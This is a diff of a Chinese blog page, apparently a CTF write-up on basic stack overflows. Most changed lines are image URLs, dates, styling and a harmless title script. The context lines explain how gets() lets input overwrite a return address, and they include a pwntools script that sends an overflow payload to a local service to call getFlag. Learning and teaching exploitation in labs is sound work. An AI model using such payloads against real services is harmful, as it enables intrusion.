@@ -22,16 +22,16 @@
 <meta property="og:url" content="http://0x48.pw/2016/11/03/0x26/index.html">
 <meta property="og:site_name" content="Hc1m1">
 <meta property="og:description" content="总结下内部CTF平台中的栈溢出PWN">
-<meta property="og:image" content="http://qn.lazysheep.cc/img/pwn00.png">
-<meta property="og:image" content="http://qn.lazysheep.cc/img/pwn01.png">
-<meta property="og:image" content="http://qn.lazysheep.cc/img/pwn02.png">
-<meta property="og:image" content="http://qn.lazysheep.cc/img/pwn03.png">
-<meta property="og:image" content="http://qn.lazysheep.cc/img/pwn04.png">
-<meta property="og:updated_time" content="2018-02-06T07:11:01.070Z">
+<meta property="og:image" content="http://0x48.pw/img/pwn00.png">
+<meta property="og:image" content="http://0x48.pw/img/pwn01.png">
+<meta property="og:image" content="http://0x48.pw/img/pwn02.png">
+<meta property="og:image" content="http://0x48.pw/img/pwn03.png">
+<meta property="og:image" content="http://0x48.pw/img/pwn04.png">
+<meta property="og:updated_time" content="2018-02-09T04:19:09.870Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PWN学习总结之基础栈溢出">
 <meta name="twitter:description" content="总结下内部CTF平台中的栈溢出PWN">
-<meta name="twitter:image" content="http://qn.lazysheep.cc/img/pwn00.png">
+<meta name="twitter:image" content="http://0x48.pw/img/pwn00.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -357,16 +357,16 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ binwalk pwn0</div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)</div><div class="line">1746          0x6D2           Unix path: /home/pwn/pwn0/flag</div></pre></td></tr></table></figure>
 <p>从binwalk中得知这是一个32位的二进制文件, 然后丢到32位的IDA中</p>
 <p>简单来看可以直接用F5, 也可以直接看汇编, 锻炼一下自己.</p>
-<p>很容易能找到一个<code>getFlag</code>函数<br><img src="//qn.lazysheep.cc/img/pwn00.png" alt="pwn00"></p>
+<p>很容易能找到一个<code>getFlag</code>函数<br><img src="/img/pwn00.png" alt="pwn00"></p>
 <p>只要能调用该函数, 那么就可以得到flag</p>
 <p>还有两个函数<code>foo</code>和<code>main</code></p>
-<p><img src="//qn.lazysheep.cc/img/pwn01.png" alt="pwn01"><br><img src="//qn.lazysheep.cc/img/pwn02.png" alt="pwn02"></p>
+<p><img src="/img/pwn01.png" alt="pwn01"><br><img src="/img/pwn02.png" alt="pwn02"></p>
 <p>代码很简单, 正常情况下是不可能调用到<code>getFlag</code>函数的, 这时候就需要想其他方法.</p>
 <p>看<code>foo</code>函数中, 调用<code>gets</code>函数之前的汇编, 我们能得到如下的栈结构:</p>
-<p><img src="//qn.lazysheep.cc/img/pwn03.png" alt="pwn03"></p>
+<p><img src="/img/pwn03.png" alt="pwn03"></p>
 <p><code>gets</code>函数得到的输入存在<code>eax</code>指向的地址, 因为<code>gets</code>函数没有限制输入的长度, 如果获取输入的字符串大于0x1c byte, 则会覆盖到<code>ebp</code>以下的栈数据, <code>ret</code>表示函数执行结束后的返回地址, 如果<code>foo</code>函数执行结束, <code>eip</code>就会跳向这个地址, 所以我们可以通过把<code>ret</code>的值改为<code>getFlag</code>函数的地址, 调用<code>getFlag</code>函数.</p>
 <p>通过gdb进行调试, 可以很容易理解该原理.</p>
-<p>当输入<code>32 * &#39;a&#39; + &#39;b&#39; * 4</code>时:<br><img src="//qn.lazysheep.cc/img/pwn04.png" alt="pwn04"></p>
+<p>当输入<code>32 * &#39;a&#39; + &#39;b&#39; * 4</code>时:<br><img src="/img/pwn04.png" alt="pwn04"></p>
 <p>payload0.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">#-*- coding:utf-8 -*-</div><div class="line"> </div><div class="line">from pwn import *</div><div class="line"> </div><div class="line">conn = remote(&apos;127.0.0.1&apos;, 10001)</div><div class="line">pwn_elf = ELF(&apos;pwn0&apos;)</div><div class="line">print conn.recvline()</div><div class="line">payload = &quot;a&quot; * 0x1c + &quot;a&quot; * 4             # 0x1c长度的buf + 4 byte的ebp</div><div class="line">payload += p32(pwn_elf.symbols[&apos;getFlag&apos;]) # 覆盖ret</div><div class="line">conn.sendline(payload)</div><div class="line">print conn.recv()</div><div class="line">print conn.recv()</div></pre></td></tr></table></figure></p>
 <p>不过这是下一题的解法, 在<code>foo</code>函数中不是还有一个条件语句调用<code>getFlag</code>函数么， 只要让该判断成立, 就好了, 上面的理解了, 现在说的这种方法就一目了然了, 用于判断的变量a1， 为函数实参, 在栈中位于ret之下, 所以只要输入<code>(32 + 4 + 4) * &#39;a&#39;</code>覆盖该参数, 则可使判断成立</p>
 <h1 id="0x2-PWN1"><a href="#0x2-PWN1" class="headerlink" title="0x2 PWN1"></a>0x2 PWN1</h1><p>使用上面所说的方法, 控制eip跳转到<code>getFlag</code>函数</p>
@@ -423,7 +423,7 @@
         <p><span>本文标题:</span><a href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
         <p><span>发布时间:</span>2016-11-03, 08:18:51</p>
-        <p><span>最后更新:</span>2018-02-06, 15:11:01</p>
+        <p><span>最后更新:</span>2018-02-09, 12:19:09</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2016/11/03/0x26/" title="PWN学习总结之基础栈溢出">http://0x48.pw/2016/11/03/0x26/</a>
             <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/11/03/0x26/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -468,8 +468,8 @@
         .left-col .switch-area {
             display: none;
         }
-        .toc-level-3 i,
-        .toc-level-3 ol {
+        .toc-level-6 i,
+        .toc-level-6 ol {
             display: none !important;
         }
     </style>
@@ -519,7 +519,7 @@
         <div id="footer-info">
             <div class="footer-left">
                 <i class="fa fa-copyright"></i> 
-                2016-2018 Hcamael
+                2015-2018 Hcamael
             </div>
             <div class="footer-right">
                 <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
@@ -578,6 +578,23 @@
         }
     
 </script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
 
 <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
